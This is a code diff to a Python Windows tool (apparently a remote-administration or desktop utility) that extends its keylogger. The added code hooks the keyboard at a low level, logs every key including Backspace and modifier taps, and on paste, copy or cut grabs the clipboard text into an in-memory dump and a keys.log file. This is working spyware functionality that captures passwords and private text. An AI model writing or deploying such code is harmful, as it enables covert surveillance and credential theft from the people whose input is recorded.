@@ -2656,29 +2656,54 @@ def request_admin() -> str:
 # Captured units accumulate in a rolling "line"; lines flush on Enter,
 # length, or typing gap into a bounded in-memory ring ("keylog dump") and,
 # while file logging is on, to nvdesk\keys.log (rotated at 512 KB).
-# Backspace pops the previous unit so dumps read like real input.
-# CTRL/ALT/WIN combos become [^X] / [!X] / [W+X] tokens. The hook runs on
+# Every physical key is captured as a token: Backspace is <BS> (never a
+# silent pop), standalone modifier taps are <CTRL>/<ALT>/<SHIFT>/... on
+# key-up, and CTRL/ALT/WIN combos become [^X] / [!X] / [W+X] tokens. The
+# left/right modifier VKs (0xA0-0xA5) a low-level hook can report are
+# canonicalised so combos still decode. Paste (Ctrl+V / Shift+Ins) logs a
+# [PASTE] token plus the clipboard text; Copy/Cut log [COPY]/[CUT] markers
+# with a clipboard snapshot on their own timestamped line. The hook runs on
 # a message-pump thread exactly like the cursor-pin hook; an active hook
 # dies with its process, so no atexit restore is needed.
 
 _KL_TOKENS = {
-    0x08: "<BS>", 0x09: "<TAB>", 0x0D: "<ENTER>", 0x1B: "<ESC>",
+    0x08: "<BS>", 0x09: "<TAB>", 0x0D: "<ENTER>", 0x13: "<PAUSE>",
+    0x14: "<CAPS>", 0x1B: "<ESC>", 0x5F: "<SLEEP>",
     0x21: "<PGUP>", 0x22: "<PGDN>", 0x23: "<END>", 0x24: "<HOME>",
     0x25: "<LEFT>", 0x26: "<UP>", 0x27: "<RIGHT>", 0x28: "<DOWN>",
     0x29: "<APPS>", 0x2C: "<PRTSC>", 0x2D: "<INS>", 0x2E: "<DEL>",
     0x5B: "<LWIN>", 0x5C: "<RWIN>", 0x5D: "<MENU>",
     0x6A: "<NP*>", 0x6B: "<NP+>", 0x6D: "<NP->", 0x6E: "<NP.>",
     0x6F: "<NP/>", 0x90: "<NUMLOCK>", 0x91: "<SCROLLOCK>",
+    0xA0: "<LSHIFT>", 0xA1: "<RSHIFT>", 0xA2: "<LCTRL>", 0xA3: "<RCTRL>",
+    0xA4: "<LALT>", 0xA5: "<RALT>",
+    0xA6: "<BACK>", 0xA7: "<FWD>", 0xA8: "<REFRESH>", 0xA9: "<STOP>",
+    0xAA: "<SEARCH>", 0xAB: "<FAVORITES>", 0xAC: "<BROWSERHOME>",
+    0xAD: "<MUTE>", 0xAE: "<VOLDOWN>", 0xAF: "<VOLUP>",
+    0xB0: "<NEXT>", 0xB1: "<PLAYPAUSE>", 0xB2: "<PREV>", 0xB3: "<MEDIASTOP>",
+    0xB4: "<LAUNCHMAIL>", 0xB5: "<LAUNCHMEDIA>",
 }
 _KL_MOD_SET = frozenset((0x10, 0x11, 0x12, 0x5B, 0x5C))  # shift/ctrl/alt/win
+# Low-level hooks can report the left/right split VKs; map them onto the
+# generic modifier so combo/shift decode logic stays single-path.
+_KL_MOD_CANON = {0xA0: 0x10, 0xA1: 0x10, 0xA2: 0x11, 0xA3: 0x11,
+                 0xA4: 0x12, 0xA5: 0x12}
+_KL_MOD_NAMES = {0x10: "<SHIFT>", 0x11: "<CTRL>", 0x12: "<ALT>",
+                 0x5B: "<LWIN>", 0x5C: "<RWIN>",
+                 0xA0: "<LSHIFT>", 0xA1: "<RSHIFT>",
+                 0xA2: "<LCTRL>", 0xA3: "<RCTRL>",
+                 0xA4: "<LALT>", 0xA5: "<RALT>"}
 _KL_LINE_MAX = 512
 _KL_GAP = 1.5
 _KL_RING_MAX = 400
 _KL_FILE_MAX = 512 * 1024
+_KL_CLIP_MAX = 400          # clipboard payload cap per paste/copy/cut entry
 
 _klog_state = {
     "on": False, "thread": None, "hook": 0, "cbs": [],
     "units": [], "held": set(), "caps": False,
+    # per-held-modifier: True once any other key went down during the hold
+    "combo": {}, "mod_name": {},
     "line_start": 0.0, "ring": deque(maxlen=_KL_RING_MAX),
     "lock": threading.Lock(), "file_on": True,
     "count": 0, "start_ts": 0.0,
@@ -2833,41 +2858,157 @@ def _klog_flush_now() -> None:
         _klog_flush_locked()
 
 
+def _klog_commit_locked(units, now=None) -> None:
+    """Append log units to the current line; caller holds the state lock.
+    Flushes on Enter, line length, or the typing gap exactly like the old
+    tail of _klog_handle did."""
+    s = _klog_state
+    if now is None:
+        now = time.time()
+    if not s["units"]:
+        s["line_start"] = now        # new line starts now (no stale gap)
+    s["units"].extend(units)
+    if not s["units"]:
+        s["line_start"] = now
+        return
+    joined = "".join(s["units"])
+    if ("<ENTER>" in units or len(joined) >= _KL_LINE_MAX
+            or now - s["line_start"] >= _KL_GAP):
+        _klog_flush_locked(now)
+
+
+def _klog_clip_line(text) -> str:
+    """Collapse a clipboard payload onto one line and cap its size so ring
+    entries and keys.log lines keep their single-line format."""
+    try:
+        clean = re.sub(r"\s+", " ", text or "").strip()
+    except Exception:
+        return ""
+    if len(clean) > _KL_CLIP_MAX:
+        clean = clean[:_KL_CLIP_MAX] + "..."
+    return clean
+
+
+def _klog_clip_snapshot(kind: str, delay: float) -> None:
+    """Delayed clipboard read fired by an edit key. PASTE appends the
+    payload to the current line (the focused app really did paste it there);
+    COPY/CUT land on their own timestamped line so the payload is never
+    mistaken for typed input."""
+    try:
+        time.sleep(delay)
+    except Exception:
+        return
+    if not _klog_state["on"]:
+        return
+    text = None
+    for _ in range(4):          # OpenClipboard can race the source app
+        text = _clip_read()
+        if text is not None:
+            break
+        time.sleep(0.1)
+    clean = _klog_clip_line(text)
+    if not clean:
+        return
+    s = _klog_state
+    with s["lock"]:
+        if not s["on"]:
+            return
+        if kind == "paste":
+            _klog_commit_locked([" " + clean], time.time())
+        else:
+            _klog_flush_locked(time.time())    # keep typed text order
+            line = ("%s [%s] %s"
+                    % (time.strftime("%Y-%m-%d %H:%M:%S"), kind, clean))
+            s["ring"].append(line)
+            _klog_file_append(line)
+
+
+def _klog_schedule_clip(kind: str) -> None:
+    kind = kind.upper()
+    # paste delay is short so the payload lands right after [PASTE]; copy/cut
+    # wait longer for the source app to finish owning the clipboard
+    delay = 0.22 if kind == "PASTE" else 0.35
+    try:
+        threading.Thread(target=_klog_clip_snapshot, args=(kind, delay),
+                         daemon=True, name="klclip").start()
+    except Exception:
+        pass
+
+
+def _klog_edit_intent(vk, held):
+    """Return (kind, inline token) when vk+held modifiers form a clipboard
+    edit, else None. Runs before plain translation so Ctrl+V becomes
+    [PASTE] (not [^V]), Ctrl+C / Ctrl+Ins become [COPY], Ctrl+X /
+    Shift+Del become [CUT], and Shift+Ins is a paste, not an <INS>."""
+    ctrl = 0x11 in held
+    alt = 0x12 in held
+    win = 0x5B in held or 0x5C in held
+    if vk == 0x56 and ctrl and not alt:
+        return ("paste", "[PASTE]")
+    if vk == 0x2D and 0x10 in held and not (ctrl or alt or win):
+        return ("paste", "[PASTE]")
+    if vk == 0x2D and ctrl and 0x10 not in held:
+        return ("copy", "[COPY]")
+    if vk == 0x43 and ctrl and not alt:
+        return ("copy", "[COPY]")
+    if vk == 0x58 and ctrl and not alt:
+        return ("cut", "[CUT]")
+    if vk == 0x2E and 0x10 in held and not (ctrl or alt or win):
+        return ("cut", "[CUT]")
+    return None
+
+
 def _klog_handle(vk, scan, flags) -> None:
     """Hook callback body. Runs on the pump thread (LL hook thread)."""
     s = _klog_state
     try:
-        if flags & 0x80:                       # key up
-            s["held"].discard(vk)
+        repeat = bool(flags & 0x40000000)     # typematic repeat (prev down)
+        canon = _KL_MOD_CANON.get(vk, vk)
+        if flags & 0x80:                      # key up
+            if canon in _KL_MOD_SET:
+                s["held"].discard(canon)
+                # name only matters for a standalone tap; drop it either way
+                name = (s["mod_name"].pop(canon, None)
+                        or _KL_MOD_NAMES.get(vk)
+                        or _KL_MOD_NAMES[canon])
+                # standalone tap: nothing else went down during the hold
+                if not s["combo"].pop(canon, True):
+                    with s["lock"]:
+                        s["count"] += 1
+                        _klog_commit_locked([name], time.time())
             return
-        if vk in _KL_MOD_SET:                  # shift/ctrl/alt/win down
-            s["held"].add(vk)
+        if canon in _KL_MOD_SET:              # modifier down
+            if repeat and canon in s["held"]:
+                return                        # auto-repeat: state already set
+            s["held"].add(canon)
+            s["combo"][canon] = False        # standalone until proven used
+            s["mod_name"][canon] = (_KL_MOD_NAMES.get(vk)
+                                     or _KL_MOD_NAMES[canon])
+            for m in list(s["held"]):
+                if m != canon:
+                    s["combo"][m] = True     # this press uses the others
             return
-        if vk == 0x14:                         # caps lock toggle
+        if vk == 0x14:                        # caps lock toggles letter case
+            if repeat:
+                return
             s["caps"] = not s["caps"]
-            return
-        units = _klog_translate_units(vk, scan)
+        for m in list(s["held"]):
+            s["combo"][m] = True             # any key down uses held mods
+        if repeat and (s["held"] & (_KL_MOD_SET - {0x10})):
+            return                # combo auto-repeat: no re-log spam
+        units = None
+        if not repeat:
+            edit = _klog_edit_intent(vk, s["held"])
+            if edit:
+                _klog_schedule_clip(edit[0])
+                units = [edit[1]]
+        if units is None:
+            units = _klog_translate_units(vk, scan)
         if not units:
             return
-        now = time.time()
         with s["lock"]:
-            if not s["units"]:
-                s["line_start"] = now      # new line starts now (no stale gap)
-            for u in units:
-                if u == "<BS>":
-                    if s["units"]:
-                        s["units"].pop()
-                else:
-                    s["units"].append(u)
             s["count"] += 1
-            if not s["units"]:
-                s["line_start"] = now
-            joined = "".join(s["units"])
-            flush = ("<ENTER>" in units
-                     or len(joined) >= _KL_LINE_MAX
-                     or (now - s["line_start"] >= _KL_GAP and joined))
-            if flush:
-                _klog_flush_locked(now)
+            _klog_commit_locked(units, time.time())
     except Exception:
         pass                    # never raise inside a hook callback
 
@@ -2946,6 +3087,10 @@ def _klog_stop() -> None:
     _klog_flush_now()
     s["on"] = False
     s["thread"] = None
+    s["held"].clear()
+    s["combo"].clear()
+    s["mod_name"].clear()
+    s["caps"] = False
 
 
 def _keylog_status() -> str:
